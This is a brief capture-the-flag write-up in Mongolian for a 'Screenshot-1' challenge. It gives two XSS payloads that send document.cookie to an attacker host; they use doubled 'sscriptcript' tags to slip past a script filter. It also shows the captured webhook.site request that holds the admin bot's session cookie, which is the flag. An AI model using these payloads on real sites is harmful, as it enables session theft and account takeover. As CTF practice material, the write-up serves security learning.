## Screenshot-1

http://ip/1337:/feed.php
XSS өртөмтгий байх амархан шалгаж болно. 

```
<sscriptcript> new Image().src="http://<ATTACKERIP>:<port>/?"+document.cookie; </sscriptcript>
```

эсвэл
```
<sscriptcript>document.write('<img src="http://ATTACKERIP/?'+document.cookie+'" />')</sscriptcript>
```

ирсэн хүсэлтийг шалгавал


request: https://webhook.site/ef1e3938-3e7a-49e6-bac0-09cb98fbf017?c=PHPSESSID%3DHZ%7Bye%40h_admin_cook1e_and_fl%40g_0f_ScreenShot_1%7D
parameter:   	PHPSESSID=HZ{ye@h_admin_cook1e_and_fl@g_0f_ScreenShot_1}

Headers
connection 	close
host 	webhook.site
accept-language 	en,*
accept-encoding 	gzip, deflate
accept 	*/*
user-agent 	Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
referer 	http://screen/god-wisper.php
content-length 	
content-type 	



## Screenshot-2
